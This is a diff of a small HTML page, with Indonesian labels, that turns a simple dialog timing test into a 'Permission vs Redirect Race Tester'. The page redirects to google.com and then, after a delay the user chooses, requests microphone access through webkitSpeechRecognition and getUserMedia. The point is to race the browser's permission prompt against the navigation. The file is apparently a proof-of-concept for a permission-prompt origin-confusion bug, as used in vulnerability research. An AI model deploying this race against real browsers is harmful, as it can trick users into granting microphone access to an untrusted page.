@@ -1,38 +1,80 @@
-<!doctype html>
-<html lang="en">
+<!DOCTYPE html>
+<html>
 <head>
-<meta charset="utf-8">
-<title>Android Dialog Timing Test</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<style>
-  body { font-family: Arial, sans-serif; padding: 20px; }
-  button { padding: 14px 20px; font-size: 16px; }
-  .note { color:#555; margin-top:10px; }
-</style>
+  <meta charset="utf-8">
+  <title>Permission Race Tester</title>
+  <style>
+    body { font-family: sans-serif; padding: 20px; }
+    label { display: block; margin-top: 10px; }
+    button { margin-top: 15px; padding: 8px 14px; }
+    small { color: #555; }
+  </style>
 </head>
 <body>
 
-<input onclick="start()" type="button" value="Click here" />
+<h3>Permission vs Redirect Race Tester</h3>
+
+<label>
+  Pilih timeout (ms):
+  <select id="delaySelect">
+    <option value="0">0 ms (event-loop edge)</option>
+    <option value="1">1 ms</option>
+    <option value="50">50 ms</option>
+    <option value="100" selected>100 ms</option>
+    <option value="300">300 ms</option>
+    <option value="500">500 ms</option>
+  </select>
+</label>
+
+<label>
+  Atau timeout manual (ms):
+  <input type="number" id="delayInput" placeholder="contoh: 75">
+</label>
+
+<button onclick="start()">Click to Start Test</button>
+
+<small>
+  <br>Target: redirect terjadi dulu, lalu permission request masuk.
+</small>
 
 <script>
+function getDelay() {
+  const manual = document.getElementById("delayInput").value;
+  if (manual !== "" && !isNaN(manual)) {
+    return parseInt(manual, 10);
+  }
+  return parseInt(document.getElementById("delaySelect").value, 10);
+}
+
 function start() {
-  // Request microphone access
-  var recognition = new webkitSpeechRecognition();
-  recognition.start();
+  const delay = getDelay();
+  console.log("Using delay:", delay, "ms");
 
-  navigator.webkitGetUserMedia(
-    { audio: true },
-    function(){},
-    function(){}
-  );
+  // Siapkan object saat user gesture
+  let recognition = new webkitSpeechRecognition();
 
-  // Delay navigation to create permission/navigation race
-  setTimeout(function () {
+  // Jadwalkan redirect lebih dulu
+  setTimeout(() => {
+    console.log("Redirecting now");
     document.location = "https://www.google.com";
-  }, 100);
+  }, 0);
+
+  // Permission request ditunda sesuai pilihan user
+  setTimeout(() => {
+    console.log("Requesting microphone permission");
+    try {
+      recognition.start();
+      navigator.webkitGetUserMedia(
+        { audio: true },
+        () => console.log("getUserMedia success"),
+        (e) => console.log("getUserMedia error", e)
+      );
+    } catch (e) {
+      console.log("Exception:", e);
+    }
+  }, delay);
 }
 </script>
-
 
 </body>
 </html>
